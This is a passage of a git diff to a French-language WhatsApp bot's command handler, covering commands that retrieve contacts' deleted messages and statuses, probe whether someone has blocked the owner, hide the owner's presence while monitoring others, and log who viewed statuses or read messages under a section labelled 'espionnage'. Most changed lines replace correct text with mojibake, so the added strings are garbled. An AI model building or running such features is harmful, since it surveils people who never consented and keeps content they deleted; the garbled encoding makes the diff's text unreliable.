+      return send(`ðŸ—‘ï¸ Antidelete ${protectionState.antidelete ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "deleted":
     case "delmsg": {
-      if (deletedMessages.length === 0) return send("📭 Aucun message supprimé intercepté.");
+      if (deletedMessages.length === 0) return send("ðŸ“­ Aucun message supprimÃ© interceptÃ©.");
       
-      let list = "🗑️ *Messages supprimés récents*\n\n";
+      let list = "ðŸ—‘ï¸ *Messages supprimÃ©s rÃ©cents*\n\n";
       deletedMessages.slice(-10).forEach((del, i) => {
         list += `${i + 1}. De: ${del.sender}\n`;
         list += `   Type: ${del.type}\n`;
@@ -4991,7 +4991,7 @@ ${protections}
       return send(list);
     }
 
-    // ────────── STATUTS / STORIES ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ STATUTS / STORIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "antideletestatus":
     case "savstatus":
     case "savestatus": {
@@ -5000,41 +5000,41 @@ ${protections}
       else if (param === "off") protectionState.antideletestatus = false;
       else protectionState.antideletestatus = !protectionState.antideletestatus;
       
-      return send(`📸 Sauvegarde auto des statuts ${protectionState.antideletestatus ? "✅ activée" : "❌ désactivée"}`);
+      return send(`ðŸ“¸ Sauvegarde auto des statuts ${protectionState.antideletestatus ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
     }
 
     case "deletedstatus":
     case "delstatus":
     case "statusdel": {
-      if (deletedStatuses.length === 0) return send("📭 Aucun statut supprimé intercepté.");
+      if (deletedStatuses.length === 0) return send("ðŸ“­ Aucun statut supprimÃ© interceptÃ©.");
       
-      let list = "📸 *Statuts supprimés récents*\n\n";
+      let list = "ðŸ“¸ *Statuts supprimÃ©s rÃ©cents*\n\n";
       deletedStatuses.slice(-10).forEach((status, i) => {
-        list += `${i + 1}. 👤 ${status.pushName}\n`;
-        list += `   📱 ${status.sender.split("@")[0]}\n`;
-        list += `   📝 Type: ${status.type}\n`;
-        list += `   🕐 Posté: ${status.date}\n`;
-        list += `   🗑️ Supprimé: ${status.deletedAt}\n\n`;
+        list += `${i + 1}. ðŸ‘¤ ${status.pushName}\n`;
+        list += `   ðŸ“± ${status.sender.split("@")[0]}\n`;
+        list += `   ðŸ“ Type: ${status.type}\n`;
+        list += `   ðŸ• PostÃ©: ${status.date}\n`;
+        list += `   ðŸ—‘ï¸ SupprimÃ©: ${status.deletedAt}\n\n`;
       });
       return send(list);
     }
 
     case "getstatus":
     case "sendstatus": {
-      // Envoyer un statut supprimé spécifique
+      // Envoyer un statut supprimÃ© spÃ©cifique
       const index = parseInt(args) - 1;
       if (isNaN(index) || index < 0 || index >= deletedStatuses.length) {
-        return send(`❌ Numéro invalide. Utilise .deletedstatus pour voir la liste (1-${deletedStatuses.length})`);
+        return send(`âŒ NumÃ©ro invalide. Utilise .deletedstatus pour voir la liste (1-${deletedStatuses.length})`);
       }
       
       const status = deletedStatuses[index];
-      if (!status) return send("❌ Statut non trouvé.");
+      if (!status) return send("âŒ Statut non trouvÃ©.");
       
       try {
-        let caption = `📸 *Statut #${index + 1}*\n\n`;
-        caption += `👤 De: ${status.pushName}\n`;
-        caption += `📱 ${status.sender.split("@")[0]}\n`;
-        caption += `🕐 ${status.date}`;
+        let caption = `ðŸ“¸ *Statut #${index + 1}*\n\n`;
+        caption += `ðŸ‘¤ De: ${status.pushName}\n`;
+        caption += `ðŸ“± ${status.sender.split("@")[0]}\n`;
+        caption += `ðŸ• ${status.date}`;
         
         if (status.mediaBuffer) {
           if (status.type === "image") {
@@ -5052,12 +5052,12 @@ ${protections}
             await hani.sendMessage(botNumber, { audio: status.mediaBuffer, mimetype: "audio/mp4" });
           }
         } else if (status.text) {
-          await send(caption + `\n\n💬 "${status.text}"`);
+          await send(caption + `\n\nðŸ’¬ "${status.text}"`);
         } else {
-          await send(caption + "\n\n⚠️ Média non disponible");
+          await send(caption + "\n\nâš ï¸ MÃ©dia non disponible");
         }
       } catch (e) {
-        return send("❌ Erreur: " + e.message);
+        return send("âŒ Erreur: " + e.message);
       }
       return;
     }
@@ -5065,14 +5065,14 @@ ${protections}
     case "liststatus":
     case "statuslist":
     case "allstatus": {
-      if (statusStore.size === 0) return send("📭 Aucun statut sauvegardé.");
+      if (statusStore.size === 0) return send("ðŸ“­ Aucun statut sauvegardÃ©.");
       
-      let list = "📸 *Tous les statuts sauvegardés*\n\n";
+      let list = "ðŸ“¸ *Tous les statuts sauvegardÃ©s*\n\n";
       let i = 1;
       for (const [id, status] of statusStore) {
-        list += `${i}. 👤 ${status.pushName}\n`;
-        list += `   📝 ${status.type}\n`;
-        list += `   🕐 ${status.date}\n\n`;
+        list += `${i}. ðŸ‘¤ ${status.pushName}\n`;
+        list += `   ðŸ“ ${status.type}\n`;
+        list += `   ðŸ• ${status.date}\n\n`;
         i++;
         if (i > 20) {
           list += `... et ${statusStore.size - 20} autres\n`;
@@ -5082,27 +5082,27 @@ ${protections}
       return send(list);
     }
 
-    // ────────── VÉRIFICATION BLOCAGE ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ VÃ‰RIFICATION BLOCAGE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "checkblock":
     case "blocked":
     case "isblocked": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNum = args.replace(/[^0-9]/g, "");
       
-      // Si on répond à un message, utiliser ce numéro
+      // Si on rÃ©pond Ã  un message, utiliser ce numÃ©ro
       if (quotedMsg && msg.message?.extendedTextMessage?.contextInfo?.participant) {
         targetNum = msg.message.extendedTextMessage.contextInfo.participant.split("@")[0];
       }
       
       if (!targetNum || targetNum.length < 10) {
-        return send(`❌ Spécifie un numéro.\n\nUtilisation:\n${config.PREFIXE}checkblock 2250150252467\n\nOu réponds à un message de la personne.`);
+        return send(`âŒ SpÃ©cifie un numÃ©ro.\n\nUtilisation:\n${config.PREFIXE}checkblock 22550252467\n\nOu rÃ©ponds Ã  un message de la personne.`);
       }
       
       const targetJid = targetNum + "@s.whatsapp.net";
       
       try {
-        // Méthode 1: Vérifier si on peut voir la photo de profil
+        // MÃ©thode 1: VÃ©rifier si on peut voir la photo de profil
         let profilePic = null;
         let canSeeProfile = true;
         try {
@@ -5111,17 +5111,17 @@ ${protections}
           canSeeProfile = false;
         }
         
-        // Méthode 2: Vérifier le statut "last seen" (présence)
+        // MÃ©thode 2: VÃ©rifier le statut "last seen" (prÃ©sence)
         let lastSeen = "Inconnu";
         try {
           await hani.presenceSubscribe(targetJid);
-          // Attendre un peu pour la réponse
+          // Attendre un peu pour la rÃ©ponse
           await new Promise(r => setTimeout(r, 2000));
         } catch (e) {
           // Erreur peut indiquer un blocage
         }
         
-        // Méthode 3: Vérifier si le numéro existe sur WhatsApp
+        // MÃ©thode 3: VÃ©rifier si le numÃ©ro existe sur WhatsApp
         let exists = false;
         try {
           const [result] = await hani.onWhatsApp(targetNum);
@@ -5135,32 +5135,32 @@ ${protections}
         let blocked = false;
         
         if (!exists) {
-          status = "❌ Ce numéro n'est PAS sur WhatsApp";
+          status = "âŒ Ce numÃ©ro n'est PAS sur WhatsApp";
         } else if (!canSeeProfile) {
-          status = "⚠️ Impossible de voir la photo de profil\n🔴 *Possiblement bloqué* ou photo masquée";
+          status = "âš ï¸ Impossible de voir la photo de profil\nðŸ”´ *Possiblement bloquÃ©* ou photo masquÃ©e";
           blocked = true;
         } else {
-          status = "✅ Tu n'es probablement PAS bloqué";
+          status = "âœ… Tu n'es probablement PAS bloquÃ©";
         }
         
         const info = `
-╭━━━ 🔍 *VÉRIFICATION BLOCAGE* ━━━╮
-┃
-┃ 📱 *Numéro:* ${formatted}
-┃ 
-┃ 📊 *Résultats:*
-┃ • Sur WhatsApp: ${exists ? "✅ Oui" : "❌ Non"}
-┃ • Photo visible: ${canSeeProfile ? "✅ Oui" : "❌ Non"}
-${profilePic ? `┃ • Photo: Disponible` : `┃ • Photo: Non disponible`}
-┃
-┃ 🎯 *Conclusion:*
-┃ ${status}
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+â•­â”â”â” ðŸ” *VÃ‰RIFICATION BLOCAGE* â”â”â”â•®
+â”ƒ
+â”ƒ ðŸ“± *NumÃ©ro:* ${formatted}
+â”ƒ 
+â”ƒ ðŸ“Š *RÃ©sultats:*
+â”ƒ â€¢ Sur WhatsApp: ${exists ? "âœ… Oui" : "âŒ Non"}
+â”ƒ â€¢ Photo visible: ${canSeeProfile ? "âœ… Oui" : "âŒ Non"}
+${profilePic ? `â”ƒ â€¢ Photo: Disponible` : `â”ƒ â€¢ Photo: Non disponible`}
+â”ƒ
+â”ƒ ðŸŽ¯ *Conclusion:*
+â”ƒ ${status}
+â”ƒ
+â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯
 
-⚠️ *Note:* Cette vérification n'est pas 100% fiable.
-Si la personne a masqué sa photo pour tous, 
-ça peut donner un faux positif.
+âš ï¸ *Note:* Cette vÃ©rification n'est pas 100% fiable.
+Si la personne a masquÃ© sa photo pour tous, 
+Ã§a peut donner un faux positif.
         `.trim();
         
         // Envoyer la photo de profil si disponible
@@ -5179,26 +5179,26 @@ Si la personne a masqué sa photo pour tous,
         return reply(info);
         
       } catch (e) {
-        return send("❌ Erreur: " + e.message);
+        return send("âŒ Erreur: " + e.message);
       }
     }
 
-    // ────────── TÉLÉCHARGER TOUS LES STATUTS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ TÃ‰LÃ‰CHARGER TOUS LES STATUTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "dlallstatus":
     case "getstatuts":
     case "allstatus": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (statusStore.size === 0) {
-        return send("📭 Aucun statut sauvegardé.\n\nLes statuts sont sauvegardés automatiquement quand tes contacts en publient.");
+        return send("ðŸ“­ Aucun statut sauvegardÃ©.\n\nLes statuts sont sauvegardÃ©s automatiquement quand tes contacts en publient.");
       }
       
-      await send(`📤 Envoi de ${statusStore.size} statut(s) sauvegardé(s)...`);
+      await send(`ðŸ“¤ Envoi de ${statusStore.size} statut(s) sauvegardÃ©(s)...`);
       
       let sent = 0;
       for (const [id, status] of statusStore) {
         try {
-          const caption = `📸 *Statut de ${status.pushName}*\n📱 ${formatPhoneNumber(status.sender?.split("@")[0])}\n🕐 ${status.date}`;
+          const caption = `ðŸ“¸ *Statut de ${status.pushName}*\nðŸ“± ${formatPhoneNumber(status.sender?.split("@")[0])}\nðŸ• ${status.date}`;
           
           if (status.mediaBuffer) {
             if (status.type === "imageMessage") {
@@ -5222,12 +5222,12 @@ Si la personne a masqué sa photo pour tous,
             }
           } else if (status.text) {
             await hani.sendMessage(from, { 
-              text: `📝 *Statut texte de ${status.pushName}*\n\n"${status.text}"\n\n🕐 ${status.date}` 
+              text: `ðŸ“ *Statut texte de ${status.pushName}*\n\n"${status.text}"\n\nðŸ• ${status.date}` 
             });
             sent++;
           }
           
-          // Pause pour éviter le spam
+          // Pause pour Ã©viter le spam
           await new Promise(r => setTimeout(r, 1000));
           
         } catch (e) {
@@ -5235,17 +5235,17 @@ Si la personne a masqué sa photo pour tous,
         }
       }
       
-      return send(`✅ ${sent}/${statusStore.size} statut(s) envoyé(s).`);
+      return send(`âœ… ${sent}/${statusStore.size} statut(s) envoyÃ©(s).`);
     }
 
-    // ────────── FUN ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ FUN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "sticker":
     case "s": {
-      if (!quotedMsg) return send("❌ Réponds à une image ou vidéo pour créer un sticker.");
+      if (!quotedMsg) return send("âŒ RÃ©ponds Ã  une image ou vidÃ©o pour crÃ©er un sticker.");
       
       const mediaType = getContentType(quotedMsg);
       if (!["imageMessage", "videoMessage"].includes(mediaType)) {
-        return send("❌ Réponds à une image ou vidéo.");
+        return send("âŒ RÃ©ponds Ã  une image ou vidÃ©o.");
       }
       
       try {
@@ -5262,53 +5262,53 @@ Si la personne a masqué sa photo pour tous,
           author: config.STICKER_AUTHOR
         });
       } catch (e) {
-        return send("❌ Erreur création sticker: " + e.message);
+        return send("âŒ Erreur crÃ©ation sticker: " + e.message);
       }
       return;
     }
 
-    // ────────── OUTILS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ OUTILS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "calc":
     case "calculate": {
-      if (!args) return send("❌ Donne une expression. Ex: .calc 5+5*2");
+      if (!args) return send("âŒ Donne une expression. Ex: .calc 5+5*2");
       
       try {
-        // Sécurité: n'autoriser que les caractères mathématiques
+        // SÃ©curitÃ©: n'autoriser que les caractÃ¨res mathÃ©matiques
         const sanitized = args.replace(/[^0-9+\-*/().%\s]/g, "");
         const result = eval(sanitized);
-        return reply(`🔢 *Calculatrice*\n\n${sanitized} = *${result}*`);
+        return reply(`ðŸ”¢ *Calculatrice*\n\n${sanitized} = *${result}*`);
       } catch (e) {
-        return send("❌ Expression invalide.");
+        return send("âŒ Expression invalide.");
       }
     }
 
-    // ────────── OWNER ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ OWNER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "ban": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un à bannir.");
+      if (!target) return send("âŒ Mentionne quelqu'un Ã  bannir.");
       
       db.ban(target);
-      return reply(`🚫 @${target.split("@")[0]} est banni du bot.`, { mentions: [target] });
+      return reply(`ðŸš« @${target.split("@")[0]} est banni du bot.`, { mentions: [target] });
     }
 
     case "unban": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un à débannir.");
+      if (!target) return send("âŒ Mentionne quelqu'un Ã  dÃ©bannir.");
       
       db.unban(target);
-      return reply(`✅ @${target.split("@")[0]} est débanni.`, { mentions: [target] });
+      return reply(`âœ… @${target.split("@")[0]} est dÃ©banni.`, { mentions: [target] });
     }
 
     case "banlist": {
-      if (!isSudo) return send("❌ Commande réservée aux sudos.");
+      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
       
-      if (db.data.banned.length === 0) return send("✅ Aucun utilisateur banni.");
+      if (db.data.banned.length === 0) return send("âœ… Aucun utilisateur banni.");
       
-      let list = "🚫 *Utilisateurs bannis*\n\n";
+      let list = "ðŸš« *Utilisateurs bannis*\n\n";
       db.data.banned.forEach((jid, i) => {
         list += `${i + 1}. @${jid.split("@")[0]}\n`;
       });
@@ -5317,55 +5317,55 @@ Si la personne a masqué sa photo pour tous,
 
     case "sudo":
     case "addsudo": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       db.addSudo(target);
-      return reply(`👑 @${target.split("@")[0]} est maintenant sudo.`, { mentions: [target] });
+      return reply(`ðŸ‘‘ @${target.split("@")[0]} est maintenant sudo.`, { mentions: [target] });
     }
 
     case "delsudo":
     case "removesudo": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let target = mentioned[0] || quotedParticipant;
-      if (!target) return send("❌ Mentionne quelqu'un.");
+      if (!target) return send("âŒ Mentionne quelqu'un.");
       
       db.removeSudo(target);
-      return reply(`✅ @${target.split("@")[0]} n'est plus sudo.`, { mentions: [target] });
+      return reply(`âœ… @${target.split("@")[0]} n'est plus sudo.`, { mentions: [target] });
     }
 
     case "sudolist": {
-      if (!isSudo) return send("❌ Commande réservée aux sudos.");
+      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
       
-      if (db.data.sudo.length === 0) return send("📭 Aucun sudo configuré.");
+      if (db.data.sudo.length === 0) return send("ðŸ“­ Aucun sudo configurÃ©.");
       
-      let list = "👑 *Sudos*\n\n";
+      let list = "ðŸ‘‘ *Sudos*\n\n";
       db.data.sudo.forEach((jid, i) => {
         list += `${i + 1}. @${jid.split("@")[0]}\n`;
       });
       return hani.sendMessage(from, { text: list, mentions: db.data.sudo });
     }
 
-    // ────────── ✅ GESTION DES UTILISATEURS APPROUVÉS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ âœ… GESTION DES UTILISATEURS APPROUVÃ‰S â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "approve":
     case "addapprove": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       let target = mentioned[0] || quotedParticipant;
       
       if (!target && !targetNumber) {
-        return send(`❌ *Usage:* .approve [numéro ou @mention]
+        return send(`âŒ *Usage:* .approve [numÃ©ro ou @mention]
         
-📱 *Exemples:*
-• .approve 2250150252467
-• .approve @mention
-• Réponds à un message avec .approve
+ðŸ“± *Exemples:*
+â€¢ .approve 22550252467
+â€¢ .approve @mention
+â€¢ RÃ©ponds Ã  un message avec .approve
 
-✨ *Info:* Les utilisateurs approuvés peuvent utiliser des commandes comme GPT, DALL-E, téléchargements, etc.`);
+âœ¨ *Info:* Les utilisateurs approuvÃ©s peuvent utiliser des commandes comme GPT, DALL-E, tÃ©lÃ©chargements, etc.`);
       }
       
       if (!target && targetNumber) {
@@ -5375,24 +5375,24 @@ Si la personne a masqué sa photo pour tous,
       const targetNum = target.split("@")[0];
       if (db.addApproved(targetNum)) {
         return hani.sendMessage(from, { 
-          text: `✅ *Utilisateur approuvé!*\n\n📱 @${targetNum}\n\n✨ Il/Elle peut maintenant utiliser les commandes IA, téléchargements et plus!`, 
+          text: `âœ… *Utilisateur approuvÃ©!*\n\nðŸ“± @${targetNum}\n\nâœ¨ Il/Elle peut maintenant utiliser les commandes IA, tÃ©lÃ©chargements et plus!`, 
           mentions: [target] 
         });
       } else {
-        return send(`⚠️ @${targetNum} est déjà approuvé.`);
+        return send(`âš ï¸ @${targetNum} est dÃ©jÃ  approuvÃ©.`);
       }
     }
 
     case "unapprove":
     case "removeapprove":
     case "delapprove": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       let target = mentioned[0] || quotedParticipant;
       
       if (!target && !targetNumber) {
-        return send(`❌ *Usage:* .unapprove [numéro ou @mention]`);
+        return send(`âŒ *Usage:* .unapprove [numÃ©ro ou @mention]`);
       }
       
       if (!target && targetNumber) {
@@ -5402,34 +5402,34 @@ Si la personne a masqué sa photo pour tous,
       const targetNum = target.split("@")[0];
       if (db.removeApproved(targetNum)) {
         return hani.sendMessage(from, { 
-          text: `✅ *Accès retiré!*\n\n📱 @${targetNum} n'est plus approuvé.`, 
+          text: `âœ… *AccÃ¨s retirÃ©!*\n\nðŸ“± @${targetNum} n'est plus approuvÃ©.`, 
           mentions: [target] 
         });
       } else {
-        return send(`⚠️ @${targetNum} n'était pas dans la liste des approuvés.`);
+        return send(`âš ï¸ @${targetNum} n'Ã©tait pas dans la liste des approuvÃ©s.`);
       }
     }
 
     case "approved":
     case "approvelist":
     case "approvedlist": {
-      if (!isSudo) return send("❌ Commande réservée aux sudos.");
+      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
       
       const approvedList = db.getApprovedList();
       
       if (approvedList.length === 0) {
-        return send(`📭 *Aucun utilisateur approuvé*
+        return send(`ðŸ“­ *Aucun utilisateur approuvÃ©*
 
-✨ Utilise \`.approve @mention\` pour ajouter quelqu'un.
+âœ¨ Utilise \`.approve @mention\` pour ajouter quelqu'un.
 
-👥 *Niveaux d'accès:*
-• 👑 *Owner:* Accès total
-• 🛡️ *Sudo:* Commandes admin
-• ✅ *Approuvé:* IA, downloads, jeux
-• 👤 *Public:* Menu, ping, sticker`);
+ðŸ‘¥ *Niveaux d'accÃ¨s:*
+â€¢ ðŸ‘‘ *Owner:* AccÃ¨s total
+â€¢ ðŸ›¡ï¸ *Sudo:* Commandes admin
+â€¢ âœ… *ApprouvÃ©:* IA, downloads, jeux
+â€¢ ðŸ‘¤ *Public:* Menu, ping, sticker`);
       }
       
-      let list = `✅ *Utilisateurs Approuvés (${approvedList.length})*\n\n`;
+      let list = `âœ… *Utilisateurs ApprouvÃ©s (${approvedList.length})*\n\n`;
       const jidList = [];
       approvedList.forEach((num, i) => {
         const jid = num.includes("@") ? num : num + "@s.whatsapp.net";
@@ -5437,34 +5437,34 @@ Si la personne a masqué sa photo pour tous,
         list += `${i + 1}. @${num.replace("@s.whatsapp.net", "")}\n`;
       });
       
-      list += `\n👑 Pour retirer: \`.unapprove @mention\``;
+      list += `\nðŸ‘‘ Pour retirer: \`.unapprove @mention\``;
       
       return hani.sendMessage(from, { text: list, mentions: jidList });
     }
 
     case "anticall": {
-      if (!isSudo) return send("❌ Commande réservée aux sudos.");
+      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
       
       const param = args.toLowerCase();
       if (param === "on") protectionState.anticall = true;
       else if (param === "off") protectionState.anticall = false;
       else protectionState.anticall = !protectionState.anticall;
       
-      return send(`📞 Anticall ${protectionState.anticall ? "✅ activé" : "❌ désactivé"}`);
+      return send(`ðŸ“ž Anticall ${protectionState.anticall ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
     }
 
     case "restart": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
-      await send("🔄 Redémarrage en cours...");
+      await send("ðŸ”„ RedÃ©marrage en cours...");
       process.exit(0);
     }
 
-    // ────────── 👻 PRÉSENCE / INVISIBILITÉ ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ‘» PRÃ‰SENCE / INVISIBILITÃ‰ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "invisible":
     case "presence":
     case "online": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args?.toLowerCase();
       
@@ -5476,71 +5476,71 @@ Si la personne a masqué sa photo pour tous,
         spyConfig.ghostModeAdvanced.hideRead = true;
         spyConfig.ghostModeAdvanced.hideRecording = true;
         
-        // Démarrer le maintien de présence invisible
+        // DÃ©marrer le maintien de prÃ©sence invisible
         startGhostMode(hani);
         
         await hani.sendPresenceUpdate("unavailable");
-        return send(`👻 *Mode INVISIBLE activé!*
+        return send(`ðŸ‘» *Mode INVISIBLE activÃ©!*
 
-✅ Tu n'apparais plus "en ligne" sur WhatsApp.
-• ⚪ Personne ne te voit en ligne
-• ✍️ "Écrit..." n'est pas envoyé
-• ✅ Confirmations de lecture bloquées
-• 🔄 Mode maintenu en continu
+âœ… Tu n'apparais plus "en ligne" sur WhatsApp.
+â€¢ âšª Personne ne te voit en ligne
+â€¢ âœï¸ "Ã‰crit..." n'est pas envoyÃ©
+â€¢ âœ… Confirmations de lecture bloquÃ©es
+â€¢ ðŸ”„ Mode maintenu en continu
 
-⚠️ Tu peux toujours voir les activités des autres!
+âš ï¸ Tu peux toujours voir les activitÃ©s des autres!
 
-💡 Utilise \`.invisible on\` pour redevenir visible.`);
+ðŸ’¡ Utilise \`.invisible on\` pour redevenir visible.`);
       } else if (param === "on" || param === "visible" || param === "show") {
-        // Désactiver le mode ghost
+        // DÃ©sactiver le mode ghost
         spyConfig.ghostMode = false;
         spyConfig.ghostModeAdvanced.hideOnline = false;
         spyConfig.ghostModeAdvanced.hideTyping = false;
         spyConfig.ghostModeAdvanced.hideRead = false;
         spyConfig.ghostModeAdvanced.hideRecording = false;
         
-        // Arrêter le maintien invisible
+        // ArrÃªter le maintien invisible
         stopGhostMode(hani);
         
         await hani.sendPresenceUpdate("available");
-        return send(`👁️ *Mode VISIBLE activé!*
+        return send(`ðŸ‘ï¸ *Mode VISIBLE activÃ©!*
 
-✅ Tu apparais maintenant "en ligne" normalement.
-• 🟢 Les autres te voient en ligne
-• ✍️ "Écrit..." est visible
-• ✅ Confirmations de lecture envoyées
+âœ… Tu apparais maintenant "en ligne" normalement.
+â€¢ ðŸŸ¢ Les autres te voient en ligne
+â€¢ âœï¸ "Ã‰crit..." est visible
+â€¢ âœ… Confirmations de lecture envoyÃ©es
 
-💡 Utilise \`.invisible off\` pour devenir invisible.`);
+ðŸ’¡ Utilise \`.invisible off\` pour devenir invisible.`);
       } else {
-        const status = spyConfig.ghostMode ? "👻 INVISIBLE" : "👁️ VISIBLE";
-        const intervalStatus = ghostModeInterval ? "🟢 Actif" : "⚪ Inactif";
-        return send(`👻 *Gestion de la présence*
+        const status = spyConfig.ghostMode ? "ðŸ‘» INVISIBLE" : "ðŸ‘ï¸ VISIBLE";
+        const intervalStatus = ghostModeInterval ? "ðŸŸ¢ Actif" : "âšª Inactif";
+        return send(`ðŸ‘» *Gestion de la prÃ©sence*
 
-📊 *État actuel:* ${status}
-🔄 *Système:* ${intervalStatus}
+ðŸ“Š *Ã‰tat actuel:* ${status}
+ðŸ”„ *SystÃ¨me:* ${intervalStatus}
 
 *Usage:*
-• \`.invisible off\` - Devenir invisible
-• \`.invisible on\` - Redevenir visible
+â€¢ \`.invisible off\` - Devenir invisible
+â€¢ \`.invisible on\` - Redevenir visible
 
 *Ce que fait le mode invisible:*
-• Personne ne te voit "en ligne"
-• "Écrit..." n'est pas envoyé
-• Confirmations de lecture bloquées
-• Mode maintenu en continu automatiquement`);
+â€¢ Personne ne te voit "en ligne"
+â€¢ "Ã‰crit..." n'est pas envoyÃ©
+â€¢ Confirmations de lecture bloquÃ©es
+â€¢ Mode maintenu en continu automatiquement`);
       }
     }
 
-    // ────────── 🕵️ ESPIONNAGE: QUI VOIT/LIT ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ ESPIONNAGE: QUI VOIT/LIT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "spy":
     case "espion":
     case "viewers":
     case "stalkers": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const param = args?.toLowerCase();
       
-      // Fonction locale pour formater le numéro
+      // Fonction locale pour formater le numÃ©ro
       const formatNum = (num) => {
         if (!num) return "Inconnu";
         const clean = num.replace(/[^0-9]/g, '');
@@ -5555,14 +5555,14 @@ Si la personne a masqué sa photo pour tous,
       if (param === "status" || param === "statuts" || param === "vues") {
         // Afficher qui a vu les statuts
         if (spyData.statusViews.length === 0) {
-          return send(`👁️ *Aucune vue de statut enregistrée*
+          return send(`ðŸ‘ï¸ *Aucune vue de statut enregistrÃ©e*
 
 _Poste un statut et attends que quelqu'un le regarde!_`);
         }
         
-        let list = `👁️ ═══════════════════════════
+        let list = `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     *QUI A VU TES STATUTS*
-═══════════════════════════\n\n`;
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
         const uniqueViewers = {};
         
         // Compter les vues par personne
@@ -5575,31 +5575,31 @@ _Poste un statut et attends que quelqu'un le regarde!_`);
         
         let i = 1;
         for (const [num, data] of Object.entries(uniqueViewers)) {
-          const displayName = data.name || "Non enregistré";
-          list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}
-   📱 *Numéro:* ${formatNum(num)}
-   🔢 *Brut:* ${num}
-   👁️ ${data.count} vue(s) • 🕐 ${data.lastTime}
-   💬 wa.me/${num}\n\n`;
+          const displayName = data.name || "Non enregistrÃ©";
+          list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}
+   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
+   ðŸ”¢ *Brut:* ${num}
+   ðŸ‘ï¸ ${data.count} vue(s) â€¢ ðŸ• ${data.lastTime}
+   ðŸ’¬ wa.me/${num}\n\n`;
           i++;
           if (i > 15) break;
         }
         
-        list += `═══════════════════════════
-📊 *Total:* ${spyData.statusViews.length} vues de ${uniqueViewers ? Object.keys(uniqueViewers).length : 0} personnes`;
+        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ“Š *Total:* ${spyData.statusViews.length} vues de ${uniqueViewers ? Object.keys(uniqueViewers).length : 0} personnes`;
         return send(list);
         
       } else if (param === "messages" || param === "read" || param === "lu") {
         // Afficher qui a lu les messages
         if (spyData.messageReads.length === 0) {
-          return send(`📖 *Aucune lecture enregistrée*
+          return send(`ðŸ“– *Aucune lecture enregistrÃ©e*
 
